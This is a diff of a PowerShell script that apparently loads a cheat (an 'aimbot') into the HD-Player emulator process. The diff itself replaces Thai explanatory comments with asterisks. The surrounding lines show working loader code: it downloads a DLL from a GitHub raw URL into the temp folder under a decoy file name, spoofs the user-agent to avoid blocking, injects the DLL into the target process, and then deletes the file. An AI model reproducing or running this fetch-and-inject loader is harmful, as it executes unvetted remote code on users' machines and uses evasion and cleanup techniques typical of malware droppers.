@@ -1,3 +1,4 @@
+# ********************
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 $Name    = "Relaxwtf777's Application"
@@ -45,7 +46,7 @@ function Show-Auth {
 }
 
 if (Show-Auth) {
-    # แก้ไขลิงก์เป็น winsky.dll ตามที่คุณเปลี่ยนชื่อไฟล์ใน GitHub
+    # ********************
     $dllUrl = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/refs/heads/main/winsky.dll"
     $tempPath = "$env:TEMP\sys_node_cache.dll"
     $targetProc = "HD-Player"
@@ -53,7 +54,7 @@ if (Show-Auth) {
     Write-Host "[*] Syncing data with node-storage..." -ForegroundColor Yellow
     try {
         $webClient = New-Object System.Net.WebClient
-        # ปลอมแปลง User-Agent เพื่อป้องกันบางระบบบล็อกสคริปต์
+        # ********************
         $webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)")
         $webClient.DownloadFile($dllUrl, $tempPath)
     } catch {
@@ -88,7 +89,7 @@ if (Show-Auth) {
     Add-Type -TypeDefinition $Source
     [NodeHandler]::StartNode($tempPath, $targetProc)
     Write-Host "[+] Injection Completed. Aimbot Active." -ForegroundColor Green
-    # ลบไฟล์ชั่วคราวทิ้งทันที
+    # ***********
     Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
 } else {
     Write-Host "Closing in 5 seconds..."
